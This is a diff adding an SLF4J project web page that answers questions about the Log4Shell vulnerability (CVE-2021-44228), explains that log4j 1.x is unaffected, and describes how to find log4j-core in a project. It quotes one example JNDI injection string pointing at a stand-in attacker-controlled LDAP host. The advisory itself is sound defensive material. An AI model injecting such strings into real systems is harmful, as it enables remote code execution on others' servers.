@@ -1,0 +1,112 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
+    <title>SLF4J</title>
+    <link rel="stylesheet" type="text/css" media="screen" href="css/site.css" />
+  </head>
+  <body>
+    
+    <script type="text/javascript">prefix='';</script>
+    <script type="text/javascript" src="js/jquery-min.js"></script>
+    <script src="templates/header.js" type="text/javascript"></script>
+    <div id="left">
+      <noscript>Please turn on Javascript to view this menu</noscript>
+      <script src="templates/left.js" type="text/javascript"></script>
+    </div>
+    <div id="right">
+      <script src="templates/right.js" type="text/javascript"></script>
+    </div>
+    <div id="content">
+
+      <h1>Comments on the CVE-2021-44228 vulnerability</h1>
+          
+
+
+      <p>CVE-2021-44228 is a vulnerability classified under the
+      highest severity mark, i.e. 10 out of 10. It allows an attacker
+      to execute arbitrary code by injecting attacker-controlled data
+      into a logged message. As far as vulnerabilities are concerned,
+      CVE-2021-44228 is probably as bad as it gets.
+      </p>
+
+      <p>Superlatives aside, it is important to understand the <a
+      href="https://www.lunasec.io/docs/blog/log4j-zero-day/">mechanics
+      of the vulnerability</a>. The exploit becomes effective when the
+      attacker can inject a string containing a substring in the form
+      "&dollar;&lbrace;jndi:ldap://some.attacker-controlled.site/&rbrace;". Opportunities
+      for injecting such a string seem endless.
+      </p>
+
+      <p>Log4j 2.x is open for this attack because it performs a
+      lookup, aka string substitution, using the JNDI protocol,
+      whenever the "&dollar;&lbrace;jndi:...&rbrace;" string is found
+      within a message parameter. As mentioned above, the contents of
+      the message parameter can be injected by the attacker quite
+      easily.</p>
+
+      <h3>Is log4j 1.x vulnerable?</h3>
+
+      <p class="highlight">As log4j 1.x does not offer a look-up
+      mechanism, it does not suffer from CVE-2021-44228 in any shape
+      or form.</p>
+
+      <p>As log4j version 1.x is still very widely deployed, we have
+      been receiving a steady stream of questions regarding the
+      vulnerability of log4j version 1.x.
+
+
+      <p><b>As log4j 1.x does not offer a look up mechanism, it does not
+      suffer from CVE-2021-44228 in any shape or form.</b> Any innuendo
+      claiming otherwise is false.</p>
+
+
+      <h3>How about the SLF4J API?</h3>
+
+      <p>The SLF4J API is just an API which lets message data go
+      through. As such, using log4j 2.x even via SLF4J does not
+      mitigate the vulnerability.
+      </p>
+
+      <p>However, as mentioned previously, log4j 1.x is safe. Thus, if
+      your SLF4J provider/binding is <em>slf4j-logj12.jar</em>, you
+      are safe.</p>
+
+      <p>If you are using <em>log4j-over-slf4j.jar</em> with SLF4J
+      API, you are safe unless the underlying implementation is log4j
+      2.x.</p>
+
+      <h3>How do I know if log4j 2.x is in use in my project?</h3>
+
+      <p>As an artifact can be pulled into a project transitively,
+      looking at explicit dependency declarations may not be
+      sufficient. We suggest that you look into your project's full
+      dependency tree. For Maven users, this full tree can be obtained
+      with the "mvn dependency:tree" command. </p>
+
+      <p>If <code>log4j-core</code>, located in the
+      <code>org.apache.logging.log4j</code> group, is absent, then you
+      are fine. Otherwise, either remove the said artifact or upgrade
+      to a log4j 2.x version which fixes the issue.
+      <p>
+      
+      <h3>Further reading</h3>
+      
+      <ol>
+        <li><a
+        href="https://www.lunasec.io/docs/blog/log4j-zero-day/">Log4Shell:
+        RCE 0-day exploit found in log4j2, a popular Java logging
+        package</a></li>
+
+        <li><a
+        href="https://github.com/lunasec-io/lunasec/blob/master/docs/blog/2021-12-09-log4j-zero-day.md">lunasec-io/lunasec</a></li>
+
+      </ol>
+      
+      
+      
+    </div>
+  </body>
+</html>
